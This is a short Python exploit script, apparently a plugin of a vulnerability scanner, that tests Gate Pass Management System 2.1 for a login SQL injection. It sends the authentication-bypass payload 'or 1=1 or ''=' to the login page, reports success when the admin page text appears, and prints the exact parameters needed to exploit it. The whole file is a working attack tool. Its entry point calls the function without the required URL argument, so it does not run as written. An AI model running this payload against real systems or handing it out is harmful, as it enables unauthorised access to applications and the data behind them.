# -*- coding: utf-8 -*-

import requests

'''
Gate Pass Management System 2.1 - 'login' SQL Injection
发现时间：2018-11-02
参考：https://www.exploit-db.com/exploits/45766/
moon.py -u gatepass http:xx.xx.xx.xx:xx   登录界面
'''

def attack(URL):
    print('[+]开始检测-Gate_Pass_Management_System_login_SQL_Injection。[+]')
    url = URL + '/login-exec.php'
    data = {
        #'login': 'admin','password': '123456',
        'login': r"'or 1=1 or ''='", 'password': r"'or 1=1 or ''='",
        'Submit': 'value',
            }
    try:
        r = requests.post(url,data=data)
        if 'Please check your username and password' in r.text:
            print('[-]账户密码错误,绕过登录失败，不存在漏洞。')
            print('检测页面：'+url)
        elif 'Industronics Engineering' in r.text:
            print('[+]绕过登录成功，存在sql注入漏洞。')
            print('漏洞连接：'+url)
            print("利用方法：login='or 1=1 or ''='&password='or 1=1 or ''='&Submit=Login")
        else:
            print('[!]检测时发生错误,可能不存在漏洞页面。')
    except:
        print('[!]连接端口时发生错误。')
    print('[+]检测完成-Gate_Pass_Management_System_login_SQL_Injection。[+]')
    print('\n')
if __name__ == "__main__":
    attack()

